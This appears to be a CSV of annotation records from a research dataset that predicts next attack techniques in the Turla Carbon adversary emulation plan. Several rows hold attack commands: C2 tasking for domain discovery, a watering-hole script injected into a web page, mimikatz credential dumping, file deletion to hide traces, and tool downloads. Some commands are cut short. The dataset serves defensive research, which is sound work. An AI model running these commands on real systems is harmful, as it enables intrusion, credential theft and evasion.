annotation_id,sample_id,source_org,plan_id,scenario_id,prefix_len,state,true_label,top1_pred,true_rank,current_access_context,exhausted_action_constraint,next_target_artifact,next_micro_verb,label_confidence,annotation_notes,ann_num,matched_yaml_pos_0based,matched_suffix_len,prefix_seq_len,matched_step_idx,matched_technique_attack_id,matched_parent_tid,matched_technique_name,matched_description,matched_command_summary,alignment_ok
ms_071,turla_carbon::unknown::12,turla_carbon,turla_carbon,unknown,12,T1566 T1204 T1069 T1059 T1574 T1105 T1112 T1033 T1110 T1070 T1570 T1053,T1069,T1053,179,post_compromise_discovery,privilege_context_not_enumerated,permission_group_context,enumerate,human_verified,human_revised_v1,71,21,1,12,22,T1069.002,T1069,Permission Groups Discovery: Domain Groups,Task the new CARBON-DLL implant with discovery commands to be run on the domain controller.,"output=$(./evalsC2client.py --set-and-complete-task #{second.carbon.id} '{""id"": 0, ""cmd"": ""net group /domain""}' --task-wait-timeout 60); echo $output | grep 'Web Servers' -i && echo $output | grep 'Web Server Admins' -i;",1
ms_072,turla_carbon::unknown::26,turla_carbon,turla_carbon,unknown,26,T1566 T1204 T1069 T1059 T1574 T1105 T1112 T1033 T1110 T1070 T1570 T1053 T1069 T1018 T1003 T1105 T1550 T1070 T1056 T1070 T1105 T1021 T1105 T1021 T1070 T1205,T1189,T1105,171,execution_on_host,user_execution_path_not_established,user_execution_channel,trigger,human_verified,human_revised_v1,72,44,1,26,45,T1189,T1189,Drive-By Compromise,Send the command to ncat to add the watering hole redirection to `index.html`,"echo ""echo \""<script>if (document.getElementById('xyz')) {{}} else {{ var gam = document.createElement('script'); gam.type = 'text/javascript'; gam.async = true; gam.src = ('http://anto-int.com/counter.js'); var sm = ...",1
ms_073,turla_carbon::unknown::2,turla_carbon,turla_carbon,unknown,2,T1566 T1204,T1069,T1204,160,execution_on_host,user_execution_path_not_established,user_execution_channel,trigger,human_verified,human_revised_v1,73,6,0,2,7,T1069.002,T1069,Permission Groups Discovery: Domain Groups,Execute net group discovery commands and execute `tasklist /svc`,"./evalsC2client.py --set-and-complete-task #{first.epic.id} 'exe | net group ""Domain Admins"" /domain && net group ""Domain Computers"" /domain && net group ""Domain Controllers"" /domain && tasklist /svc' --task-wait-time...",1
ms_074,turla_carbon::unknown::25,turla_carbon,turla_carbon,unknown,25,T1566 T1204 T1069 T1059 T1574 T1105 T1112 T1033 T1110 T1070 T1570 T1053 T1069 T1018 T1003 T1105 T1550 T1070 T1056 T1070 T1105 T1021 T1105 T1021 T1070,T1205,T1105,122,execution_on_host,xecution_capability_not_established,command_execution_channel,trigger,human_verified,human_revised_v1,74,43,0,25,44,T1205,T1205,Traffic Signaling,Send the magic packet to the Apache server using the `sendPacket.py` utility,sudo -E python3 /opt/day1/turla/Resources/Penquin/sendPacket.py --handler_ip #{attacker.host.ip} --handler_port 8081 --target_ip #{apache.server.ip} --target_port 8080 --payload_type base64,1
ms_075,turla_carbon::unknown::19,turla_carbon,turla_carbon,unknown,19,T1566 T1204 T1069 T1059 T1574 T1105 T1112 T1033 T1110 T1070 T1570 T1053 T1069 T1018 T1003 T1105 T1550 T1070 T1056,T1070,T1056,116,execution_on_host,defense_evasion_path_not_established,process_or_file_identity,modify,human_verified,human_revised_v1,75,16,0,19,17,T1070.004,T1070,Indicator Removal on Host: File Deletion,Task CARBON-DLL to remove the password spray script,"./evalsC2client.py --set-and-complete-task #{first.carbon.id} '{""id"": 2, ""cmd"": ""del /Q C:\\Windows\\Temp\\winsas64.bat""}' --task-wait-timeout 60",1
ms_076,turla_carbon::unknown::24,turla_carbon,turla_carbon,unknown,24,T1566 T1204 T1069 T1059 T1574 T1105 T1112 T1033 T1110 T1070 T1570 T1053 T1069 T1018 T1003 T1105 T1550 T1070 T1056 T1070 T1105 T1021 T1105 T1021,T1070,T1105,38,execution_on_host,defense_evasion_path_not_established,process_or_file_identity,modif,human_verified,human_revised_v1,76,41,4,24,42,T1070.004,T1070,Indicator Removal on Host: File Deletion,Task the implant to clean up downloaded files,"./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 9, ""cmd"": ""del /Q C:\\Windows\\Temp\\tmp504e.tmp C:\\Windows\\System32\\pscp.exe C:\\Windows\\System32\\plink.exe""}' --task-wait-timeout 60",1
ms_077,turla_carbon::unknown::14,turla_carbon,turla_carbon,unknown,14,T1566 T1204 T1069 T1059 T1574 T1105 T1112 T1033 T1110 T1070 T1570 T1053 T1069 T1018,T1003,T1021,24,execution_on_host,credential_material_not_collected,credential_material,dump,human_verified,human_revised_v1,77,24,2,14,25,T1003,T1003,OS Credential Dumping,Task the CARBON-DLL implant on the DC to download and execute mimikatz lsadump,"./evalsC2client.py --set-and-complete-task #{second.carbon.id} '{""id"": 3, ""payload"": ""DvKGMmGn.exe"", ""payload_dest"": ""C:\\Windows\\Temp\\terabox.exe"", ""cmd"": ""move C:\\Windows\\Temp\\terabox.exe C:\\Windows\\System32\...",1
ms_078,turla_carbon::unknown::23,turla_carbon,turla_carbon,unknown,23,T1566 T1204 T1069 T1059 T1574 T1105 T1112 T1033 T1110 T1070 T1570 T1053 T1069 T1018 T1003 T1105 T1550 T1070 T1056 T1070 T1105 T1021 T1105,T1021,T1105,21,internal_host_access,remote_execution_path_not_established,command_execution_channel,execute,human_verified,human_revised_v1,78,40,3,23,41,T1021.004,T1021,Remote Services: SSH,Task the implant to execute Penquin,"./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 8, ""cmd"": ""(echo unzip /tmp/tmp514f524f -d /tmp & echo sudo mv /tmp/hsperfdata /root/hsperfdata & echo sudo /root/hsperfdata & echo exit) | C:\\Win...",1
ms_079,turla_carbon::unknown::18,turla_carbon,turla_carbon,unknown,18,T1566 T1204 T1069 T1059 T1574 T1105 T1112 T1033 T1110 T1070 T1570 T1053 T1069 T1018 T1003 T1105 T1550 T1070,T1056,T1114,5,execution_on_host,credential_material_not_collected,credential_material,collect,human_verified,human_revised_v1,79,,0,18,,,,,,,0
ms_080,turla_carbon::unknown::22,turla_carbon,turla_carbon,unknown,22,T1566 T1204 T1069 T1059 T1574 T1105 T1112 T1033 T1110 T1070 T1570 T1053 T1069 T1018 T1003 T1105 T1550 T1070 T1056 T1070 T1105 T1021,T1105,T1105,1,execution_on_host,execution_capability_not_established,local_file_data,collect,human_verified,human_revised_v1,80,39,2,22,40,T1105,T1105,Ingress Tool Transfer,Task the implant to download plink.exe,"./evalsC2client.py --set-and-complete-task #{third.carbon.id} '{""id"": 7, ""payload"": ""plink.exe"", ""payload_dest"": ""C:\\Windows\\Temp\\plink.exe"", ""cmd"": ""move C:\\Windows\\Temp\\plink.exe C:\\Windows\\System32\\plink.e...",1
